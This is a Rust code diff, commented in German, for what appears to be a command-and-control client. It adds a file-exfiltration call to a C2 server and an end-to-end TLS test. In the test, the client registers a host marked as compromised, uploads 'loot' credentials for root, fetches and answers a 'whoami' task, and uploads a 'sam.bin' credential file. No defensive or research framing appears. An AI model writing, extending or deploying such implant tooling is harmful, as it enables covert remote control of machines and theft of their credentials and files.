@@ -45,6 +45,9 @@ pub trait C2Port {
 
     /// Meldet das Ergebnis eines ausgeführten Tasks unter `/api/tasks/result`.
     fn melde_task_ergebnis(&self, report: &TaskResultRequest) -> Result<(), TransportError>;
+
+    /// Meldet einen KXENC-Datei-Container unter `/api/files` (Issue #31).
+    fn melde_datei(&self, upload: &kx_core::c2::FileUpload) -> Result<(), TransportError>;
 }
 
 /// C2-Client — ein Adapter über den Transport aus `kx_core::c2::transport`.
@@ -79,6 +82,10 @@ impl C2Port for C2Client {
     fn melde_task_ergebnis(&self, report: &TaskResultRequest) -> Result<(), TransportError> {
         self.transport.post_json(PATH_TASKS_RESULT, report)
     }
+
+    fn melde_datei(&self, upload: &kx_core::c2::FileUpload) -> Result<(), TransportError> {
+        self.transport.post_json(kx_core::c2::PATH_FILES, upload)
+    }
 }
 
 #[cfg(test)]
@@ -96,5 +103,147 @@ mod tests {
         assert!(PATH_SECRETS.starts_with('/'));
         assert!(PATH_TASKS.starts_with('/'));
         assert!(PATH_TASKS_RESULT.starts_with('/'));
+    }
+
+    /// Alle fuenf Aufrufe des Adapters laufen ueber **echtes TLS** gegen den
+    /// echten Server: Registrierung, Beute-Upload, Task-Abholung,
+    /// Task-Ergebnis und Datei-Upload (Issues #69, #31). Gegen den Router
+    /// allein waere der Transport — TLS-Aufbau, Bearer-Header,
+    /// Statusabbildung — ungetestet.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn der_client_spricht_alle_aufrufe_ueber_echtes_tls() {
+        use kx_core::c2::{CreateTaskRequest, TaskResultRequest, STATUS_DONE};
+
+        let tls = kx_tls::generate_server_tls("127.0.0.1").expect("TLS-Material");
+        let dir = std::env::temp_dir().join(format!("kx-c2client-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(&dir).expect("Testverzeichnis");
+        let cert_pfad = dir.join("server.crt");
+        std::fs::write(&cert_pfad, &tls.cert_pem).expect("Zertifikat");
+
+        let db =
+            std::sync::Arc::new(kx_server::db::Db::open(&dir.join("kx.db")).expect("Datenbank"));
+        // ADR-0004: der Host muss vor seinem Task existieren.
+        db.upsert_host(&RegisterRequest {
+            host_id: "10.0.0.5".into(),
+            ip: "10.0.0.5".into(),
+            hostname: None,
+            os: None,
+            status: None,
+            sealed_master: None,
+            master_key: None,
+        })
+        .expect("Host");
+        let task = db
+            .insert_task(&CreateTaskRequest {
+                host_id: "10.0.0.5".into(),
+                command: "whoami".into(),
+            })
+            .expect("Task");
+        let router = kx_server::app(kx_server::AppState {
+            db: db.clone(),
+            token: std::sync::Arc::new("kx-clienttest".to_string()),
+        });
+        let config = axum_server::tls_rustls::RustlsConfig::from_pem(
+            tls.cert_pem.clone(),
+            tls.key_pem.clone(),
+        )
+        .await
+        .expect("rustls-Config");
+        let handle = axum_server::Handle::new();
+        let server_handle = handle.clone();
+        let server = tokio::spawn(async move {
+            axum_server::bind_rustls("127.0.0.1:0".parse().expect("Adresse"), config)
+                .handle(server_handle)
+                .serve(router.into_make_service())
+                .await
+                .expect("Server");
+        });
+        let addr = handle.listening().await.expect("lauschende Adresse");
+        let url = format!("https://{addr}");
+        let cert = cert_pfad.to_string_lossy().to_string();
+        let task_id = task.id.clone();
+
+        // Der Transport blockiert (ureq) — er gehoert nicht auf einen
+        // Worker-Thread des Runtimes, auf dem auch der Server laeuft.
+        let task_id_report = task_id.clone();
+        let task_id_abholung = task_id.clone();
+        tokio::task::spawn_blocking(move || {
+            let client = C2Client::new(&url, "kx-clienttest", &cert).expect("Client");
+
+            client
+                .registriere_host(&RegisterRequest {
+                    host_id: "10.0.0.5".into(),
+                    ip: "10.0.0.5".into(),
+                    hostname: Some("ziel".into()),
+                    os: Some("Linux".into()),
+                    status: Some(kx_core::c2::STATUS_COMPROMISED.into()),
+                    sealed_master: None,
+                    master_key: None,
+                })
+                .expect("Registrierung");
+
+            client
+                .melde_beute(
+                    &SecretUpload {
+                        host_id: "10.0.0.5".into(),
+                        cred_type: "password".into(),
+                        username: "root".into(),
+                        password: String::new(),
+                        source: Some("test".into()),
+                        master_key: None,
+                        sealed_password: None,
+                        sealed_master: None,
+                    }
+                    .mit_passwort("geheim"),
+                )
+                .expect("Beute-Upload");
+
+            let tasks = client.hole_tasks().expect("Task-Abholung");
+            assert!(
+                tasks.iter().any(|t| t.id == task_id_abholung),
+                "der angelegte Task fehlt in der Abholung"
+            );
+
+            client
+                .melde_task_ergebnis(&TaskResultRequest {
+                    task_id: task_id_report,
+                    status: STATUS_DONE.into(),
+                    result: "root".into(),
+                })
+                .expect("Task-Ergebnis");
+
+            client
+                .melde_datei(&kx_core::c2::FileUpload {
+                    host_id: "10.0.0.5".into(),
+                    file_id: "000102030405060708090a0b0c0d0e0f".into(),
+                    filename: "sam.bin".into(),
+                    plain_size: 128,
+                    container: "a3hlbmM=".into(),
+                    sealed_master: String::new(),
+                })
+                .expect("Datei-Upload");
+        })
+        .await
+        .expect("Client-Aufrufe");
+
+        // Die Wirkung zaehlt: der Server hat alles persistiert.
+        let hosts = db.list_hosts().expect("Hosts");
+        assert!(hosts.iter().any(|h| h.host_id == "10.0.0.5"));
+        let secrets = db.list_secrets().expect("Secrets");
+        assert_eq!(secrets.len(), 1, "die Beute fehlt in der Ablage");
+        let tasks = db.list_tasks().expect("Tasks");
+        let gemeldet = tasks
+            .iter()
+            .find(|t| t.id == task_id)
+            .expect("Task in der Ablage");
+        assert_eq!(gemeldet.status, STATUS_DONE);
+        assert_eq!(gemeldet.result, "root");
+        let files = db.list_files().expect("Dateien");
+        assert_eq!(files.len(), 1, "der Container fehlt in der Ablage");
+        assert_eq!(files[0].filename, "sam.bin");
+
+        handle.shutdown();
+        let _ = server.await;
+        std::fs::remove_dir_all(&dir).ok();
     }
 }
